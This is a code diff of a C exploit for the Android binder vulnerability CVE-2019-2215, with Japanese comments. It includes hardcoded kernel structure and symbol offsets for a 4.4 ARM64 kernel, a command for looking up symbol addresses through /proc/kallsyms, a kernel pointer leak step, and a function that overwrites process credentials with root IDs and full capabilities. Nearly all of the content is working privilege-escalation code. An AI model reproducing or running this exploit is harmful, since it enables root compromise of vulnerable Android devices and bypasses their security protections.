@@ -14,9 +14,12 @@
 #include <sys/mman.h>
 #include <sys/wait.h>
 #include <sys/syscall.h>
+#include <sys/uio.h>
 #include <sched.h>
 #include <signal.h>
 #include <pthread.h>
+
+// 提供された binder.h を使用（カーネルヘッダは使わない）
 #include "binder.h"
 
 #define LOG_TAG "CVE-2019-2215"
@@ -24,10 +27,13 @@
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
 
-// BINDER_THREAD_EXIT は binder.h に定義済み
-// 念のため定義（定義済みなら重複しないようチェック）
+// binder.h に定義がない場合のフォールバック
 #ifndef BINDER_THREAD_EXIT
 #define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
+#endif
+
+#ifndef F_SETPIPE_SZ
+#define F_SETPIPE_SZ 1031
 #endif
 
 #define PAGE_SIZE 4096
@@ -35,7 +41,6 @@
 #define IOVEC_OVERLAP_INDEX 10
 
 // ===== オフセット（要調整） =====
-// これらの値はターゲットカーネルに合わせて変更する必要があります
 // カーネル 4.4.19（ARM64）での一般的な値
 #define TASK_STRUCT_PID_OFFSET       0x4E8
 #define TASK_STRUCT_CRED_OFFSET      0x688
@@ -54,14 +59,13 @@
 #define GLOBAL_ROOT_GID 0
 #define CAP_FULL_SET 0x3FFFFFFFFF
 
-// シンボルアドレス（要調整）
-// adb shell cat /proc/kallsyms | grep -E "init_nsproxy|selinux_enforcing" で取得
+// シンボルオフセット（要調整）
+// adb shell cat /proc/kallsyms | grep -E "init_nsproxy|selinux_enforcing"
 #define SYMBOL_OFFSET_INIT_NSPROXY      0x1233ac0
 #define SYMBOL_OFFSET_SELINUX_ENFORCING 0x14acfe8
 
 static int binder_fd;
 static int epoll_fd;
-static int pipe_fd[2];
 static int sock_fd[2];
 static int krw_pipe[2];
 static struct epoll_event ev = {.events = EPOLLIN};
@@ -92,7 +96,6 @@ void *mmap_page(unsigned long addr) {
 // ----- Step 1: カーネルポインタのリーク -----
 int leak_task_struct(void) {
     int pipefd[2];
-    char buffer[PAGE_SIZE] = {0};
     int offset = IOVEC_OVERLAP_INDEX;
     pid_t cpid;
     struct iovec iovec_stack[IOVEC_COUNT];
@@ -349,7 +352,7 @@ int patch_cred(void) {
     uint32_t root = 0;
     uint64_t cap_full = CAP_FULL_SET;
 
-    // UID: uid, suid, euid, fsuid
+    // UID
     uint64_t uid_addr = cred_base + CRED_UID_OFFSET;
     if (write(krw_pipe[1], &uid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
@@ -366,7 +369,7 @@ int patch_cred(void) {
     if (write(krw_pipe[1], &fsuid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
 
-    // GID: gid, sgid, egid, fsgid
+    // GID
     uint64_t gid_addr = cred_base + CRED_GID_OFFSET;
     if (write(krw_pipe[1], &gid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
